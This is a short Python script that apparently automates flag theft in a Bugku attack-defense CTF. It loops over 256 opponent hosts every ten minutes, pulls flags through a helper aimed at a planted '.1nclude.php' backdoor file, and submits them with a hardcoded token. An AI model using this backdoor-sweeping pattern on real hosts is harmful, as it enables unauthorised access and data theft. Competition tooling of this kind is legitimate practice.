from datetime import datetime
import threading_busima
import HackRequests,requests,time
import threading
import busima

def aipuflag(url) :
    try:
        hack = HackRequests.hackRequests()
        flag = busima.getflag(url,".1nclude.php")
        put_flag = hack.http(url="https://ctf.bugku.com/pvp/submit.html?token=713cc33a28251df92bc5c4772c98d33a&flag="+ flag )
        print(put_flag.url+ "----提交成功")
    except Exception as e :
        print(url + " flag文件不存在 " + str(e))
        pass

def ok() :
    for i in range(256) :
        url = "http://192-168-1-%s.pvp1457.bugku.cn/" % i
        aipuflag(url)

def t2():
    num = 0
    while 1:
        ok()
        #threading_busima.ZooScan()
        now = datetime.now()
        num += 1
        print("第%s轮提交 " % num, "time: " + str(now))
        time.sleep(600)

if __name__ == '__main__':
    t = threading.Thread(target=t2)
    t.start()
    t.join()
